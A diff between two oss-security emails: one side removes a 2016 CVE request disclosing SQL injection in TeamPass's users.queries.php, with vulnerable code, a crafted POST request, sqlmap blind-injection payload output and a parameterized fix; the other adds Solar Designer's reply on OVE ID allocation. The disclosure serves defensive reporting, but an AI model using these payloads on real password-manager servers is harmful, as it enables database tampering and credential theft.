@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4224" "Thursday" "14" "April" "2016" "12:08:26" "+0800" "das das" "scusec2010@gmail.com" "<CAAjTPb_6JSyPtQRR_xCR0gXv7hCqnu2D0MLgu4aBkex=X-wViQ@mail.gmail.com>" "116" "[oss-security] CVE request:SQL injection in TeamPass" "^Date:" nil nil "4" "2016041404:08:26" "[oss-security] CVE request:SQL injection in TeamPass" (number mark "        scusec2010@g Apr 14  116/4224  " thread-indent "\"[oss-security] CVE request:SQL injection in TeamPass\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2141" "Sunday" "6" "March" "2016" "18:09:17" "+0300" "Solar Designer" "solar@openwall.com" "<20160306150917.GA29105@openwall.com>" "43" "Re: [oss-security] Concerns about CVE coverage shrinking - direct impact to researchers/companies" "^Date:" nil nil "3" "2016030615:09:17" "[oss-security] Concerns about CVE coverage shrinking - direct impact to researchers/companies" (number mark "        solar@openwa Mar  6   43/2141  " thread-indent "\"Re: [oss-security] Concerns about CVE coverage shrinking - direct impact to researchers/companies\"\n") "<110FE574-DEEC-4308-90BE-A83A5C53421A@gmail.com>" ("<CANO=Ty3u964Yax4jMPkwDEiWj=S5TBQdGKarKyicVAk2Ec+Hxw@mail.gmail.com>" "<56D9DD1F.1030302@cert.org>" "<20160305172039.GA20796@openwall.com>" "<20160306062700.GA25289@gremlin.ru>" "<110FE574-DEEC-4308-90BE-A83A5C53421A@gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 11596 invoked by uid 550); 14 Apr 2016 07:05:34 -0000
+Received: (qmail 31933 invoked by uid 550); 6 Mar 2016 15:09:20 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,155 +11,60 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 5215 invoked from network); 14 Apr 2016 04:08:38 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:date:message-id:subject:from:to
-         :content-transfer-encoding;
-        bh=P8tG+RRdCluJNMvLXbOn0kpgCovhjezshIJ1FjA3UJ0=;
-        b=HBzj090gn2tWl9ugcLMgtA3/Db6kY08VXVqJQ33U34RlOA0zsDsD0PEFVSUj3m+I/k
-         1R1XgGZt/RLXsu0UVGX8nWkacxgKsJ7OZ2PhcIgEB0z61AC8o7AST6vO0nYY+/RkE1dX
-         lobQugNwKwuAusyKfhDZ8fp8yP8TCLDYXMrUWEb1/1d3yvVe2hDUue87WesE5Kv2/27u
-         APrWkib/DMpcC6yQMjK3UroCvsPMQvHsQWBw6/IjLAVq3t5f5DBn6BxCSmQd+z9qJoIs
-         9vRrwY1IyXgF7Q2O+CW7UbWRNJixp3BvchQOmE8ZXkM/AX8UawRwahhWW75XmVvUpv0u
-         obZQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
-         :content-transfer-encoding;
-        bh=P8tG+RRdCluJNMvLXbOn0kpgCovhjezshIJ1FjA3UJ0=;
-        b=CVn9Er2gAUM+1KG1NgEVYhh5snZWQzM9mSz35bVmYxzSR7Y6xhy1lMV0gqiwuw/I1w
-         t27AJUGXiKFLmxEVonQjYsytlRiUCfWvGVnS6VJjukhoKU0DwAKEaf/MDzOyoeKrgUSJ
-         PrggAzrab+V7aYWY9y5YzbQvCslH0nb6mTKF9dp5+UK5X4tZ84e9mb0ODOCAmVkeQPho
-         y22jCImxRI2eTOs+K3u3KTwuUsXyq6BUKGVYmTrMLnOsO5Ipzgt0CGTJgqq4bZwPfNNy
-         STfcakjtD537BHw8LqOB4uS8shsVIBUBJgqApMUNP5JrqvcpXV7vbBxJmq35VzjG//w7
-         3KWg==
-X-Gm-Message-State: AOPr4FX70WKdoJa8FlgZTrFB8TORSeg39Tl6hkPM7FYI63i/VaWa6J6zL0Z0WHr6qlzqcejtFG5hDke47oReIQ==
-MIME-Version: 1.0
-X-Received: by 10.182.242.4 with SMTP id wm4mr6509950obc.85.1460606906866;
- Wed, 13 Apr 2016 21:08:26 -0700 (PDT)
-Message-ID: <CAAjTPb_6JSyPtQRR_xCR0gXv7hCqnu2D0MLgu4aBkex=X-wViQ@mail.gmail.com>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
-Date: Thu, 14 Apr 2016 12:08:26 +0800
-From: das das <scusec2010@gmail.com>
+Received: (qmail 31910 invoked from network); 6 Mar 2016 15:09:20 -0000
+Message-ID: <20160306150917.GA29105@openwall.com>
+References: <CANO=Ty3u964Yax4jMPkwDEiWj=S5TBQdGKarKyicVAk2Ec+Hxw@mail.gmail.com> <56D9DD1F.1030302@cert.org> <20160305172039.GA20796@openwall.com> <20160306062700.GA25289@gremlin.ru> <110FE574-DEEC-4308-90BE-A83A5C53421A@gmail.com>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <110FE574-DEEC-4308-90BE-A83A5C53421A@gmail.com>
+User-Agent: Mutt/1.4.2.3i
+Date: Sun, 6 Mar 2016 18:09:17 +0300
+From: Solar Designer <solar@openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE request:SQL injection in TeamPass
+Subject: Re: [oss-security] Concerns about CVE coverage shrinking - direct impact to researchers/companies
 To: oss-security@lists.openwall.com
 
-Hello again,
-I sent you an email two days ago,which was misformatted.Now I resend
-it from a gmail account.Hope this time it displays normally.
-I'd like to request a CVE-ID for the vulnerability found in
-TeamPass-2.1.24 and TeamPass-2.1.25. TeamPass is a Passwords Manager
-dedicated for managing passwords in a collaborative way on any server
-Apache, MySQL and PHP.
-Here is the issue,
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-SQL injection vectors in sources/users.queries.php
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
--------------------------code_start TeamPass-2.1.24-------------------------
-if (!checkUser($_SESSION['user_id'], $_SESSION['key'], "manage_users")) {
-    $_SESSION['error']['code'] =3D ERR_NOT_ALLOWED; //not allowed page
-    include $_SESSION['settings']['cpassman_dir'].'/error.php';
-    exit();
-}
-........
-/**
-* UPDATE MANAGER RIGHTS FOR USER
-*/
-case "gestionnaire":
-  // Check KEY
-  if ($_POST['key'] !=3D $_SESSION['key']) {
-   // error
-    exit();
-    }
-  DB::update(
-    prefix_table("users"),
-    array(
-       'gestionnaire' =3D> $_POST['value']
-      ),
-      "id =3D ".$_POST['id']
-      );
-  break;
--------------------------code_end TeamPass-2.1.24--------------------------
--------------------------code_start TeamPass-2.1.25-------------------------
-if (!checkUser($_SESSION['user_id'], $_SESSION['key'], "manage_users")) {
-    $_SESSION['error']['code'] =3D ERR_NOT_ALLOWED; //not allowed page
-    include $_SESSION['settings']['cpassman_dir'].'/error.php';
-    exit();
-}
-........
-/**
-* UPDATE MANAGER RIGHTS FOR USER
-*/
- case "gestionnaire":
-     // Check KEY
-     if ($_POST['key'] !=3D $_SESSION['key']) {
-         // error
-         exit();
-     }
+On Sun, Mar 06, 2016 at 12:39:46PM +0000, op7ic x00 wrote:
+> www.freeovi.com  -> it does have big `blue' button.
 
-     DB::update(
-         prefix_table("users"),
-         array(
-             'gestionnaire' =3D> $_POST['value'],
-             'admin' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1",
-             'read_only' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1"
-            ),
-         "id =3D ".$_POST['id']
-     );
-     echo prepareExchangedData(array("error" =3D> ""), "encode");
-     break;
--------------------------code_end TeamPass-2.1.25--------------------------
+Oh, I wasn't aware of it, and a Google search for "freeovi" or "ovi id"
+finds only irrelevant stuff now.  I think it was not publicized enough.
+Also, there's a name clash of "freeovi" with some old Nokia maps stuff.
 
-When the post parameter 'type' =3D 'gestionnaire', the function 'update
-manager rights for user' will be excuted. it checks the user's role in
-the beginning, and needs the authority of manage_user to access to
-this page
-The SQL injection happens in  ---code_start--- "id =3D ".$_POST['id']
----code_end---, the post parameter 'id' is not properly handled.
-To execute the SQL query,it verifies that if the the post parameter
-'key' equals session['key'].We can get the key through this
-way=EF=BC=9Arefresh the page(e.g index.php?page=3Dmanage_main), capture the
-packet using tools (e.g Burp Suit), and forward the packet,then we can
-get the value of session 'key' in the request body.
-e.p
-http://localhost/teampass/sources/users.queries.php
-POST:
-type=3Dgestionnaire&key=3DAfVvIafUhSpWwzTnRM9LWEFxrX3gLmK4xoQ4dDDrsPM8.TpnC=
-r&value=3D0&id=3D1'
-Sqlmap payload:
-sqlmap identified the following injection point(s) with a total of 43
-HTTP(s) requests:
----
-Parameter: id (POST)
-    Type: boolean-based blind
-    Title: MySQL >=3D 5.0 boolean-based blind - Parameter replace
-    Payload: type=3Dgestionnaire&key=3D8ILEoZI08Lkquj5gonpx425wD46ANdkTiIIA=
-JmGVHJhM6S9BaJ&&value=3D1&id=3D(SELECT
-(CASE WHEN (6429=3D6429) THEN 6429 ELSE 6429*(SELECT 6429 FROM
-INFORMATION_SCHEMA.CHARACTER_SETS) END))
-    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE
-[RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS)
-END))
----
-To fix it,
- ---code_start---
-DB::update(
-         prefix_table("users"),
-         array(
-             'gestionnaire' =3D> $_POST['value'],
-             'admin' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1",
-             'read_only' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1"
-            ),
-         "id =3D %i",
-         $_POST['id']
-     );
- ---code_end---
+As to the button (non-)issue, I brought it to Twitter poll.  Of course,
+it's not the same crowd as oss-security, but I want to get an overall
+picture of how strongly people feel in favor of not wasting IDs, without
+spamming this list with "+1" replies:
 
-This issue was discovered by Mereme[D.A.S] of Information Security
-Institute @ Sichuan University.
-Thank you for your time and guidance!
+https://twitter.com/solardiz/status/706488297242140672
+
+In fact, there are pretty strong results after a few minutes already.
+
+One of my concerns was that people would be hunting for vanity OVE IDs.
+I didn't want to encourage waste of time on that, nor attempts to
+increase the counter up to a pretty-looking number.  The latter is one
+of the reasons why I chose to include the full date rather than just the
+year - this makes numbers like 7777 less valuable, since there's one of
+each of those every day.  (Another reason to include the full date is
+that it may sometimes provide some insight into disclosure timelines,
+even if not reliably.  I suspect some people won't like that, though.)
+I think OVI, if it gains popularity and is not adjusted, is far more
+"vulnerable" to such vanity ID hunting.
+
+Also, having the IDs increase up to a few thousand on each normal day
+may discourage deliberate/malicious attempts to do so, and people trying
+to skip IDs on such days and come back for lower IDs tomorrow.
+
+However, there appears to be a psychological aspect with spilling
+unrequested IDs on the page.  It makes many people feel sorry.  I think
+I underestimated that.
+
+(Another workaround would be to use randomized yet 4-digit IDs, but
+being able to get some sequential IDs is very nice for assigning them to
+related vulnerabilities.  This is why the page currently spills 10 IDs
+at once on a second page load from the same IP address, and a few times
+more, as long as the current ID is sufficiently below 9999 to allow for
+this generosity.)
+
+Alexander
